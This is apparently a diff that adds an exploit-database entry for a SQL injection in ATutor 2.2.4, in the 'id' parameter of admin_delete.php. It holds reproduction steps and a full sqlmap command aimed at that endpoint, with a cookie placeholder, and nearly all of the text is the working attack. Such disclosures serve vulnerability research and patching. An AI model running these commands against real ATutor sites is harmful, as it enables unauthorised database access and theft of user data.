@@ -1,0 +1,16 @@
+# Exploit Title: ATutor 2.2.4 - 'id' SQL Injection
+# Date: 2020-02-23
+# Exploit Author: Andrey Stoykov
+# Vendor Homepage: https://atutor.github.io/
+# Software Link: https://sourceforge.net/projects/atutor/files/latest/download
+# Version: ATutor 2.2.4
+# Tested on: LAMP on Ubuntu 18.04
+
+Steps to Reproduce:
+
+1) Login as admin user
+2) Browse to the following URL:
+http://192.168.51.2/atutor/mods/_core/users/admin_delete.php?id=17' 
+3) Exploiting with SQLMAP:
+//Must supply valid User-Agent otherwise, there will be errors.
+sqlmap --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --dbms=mysql -u "http://192.168.51.2/atutor/mods/_core/users/admin_delete.php?id=17*" --cookie=<COOKIES HERE>
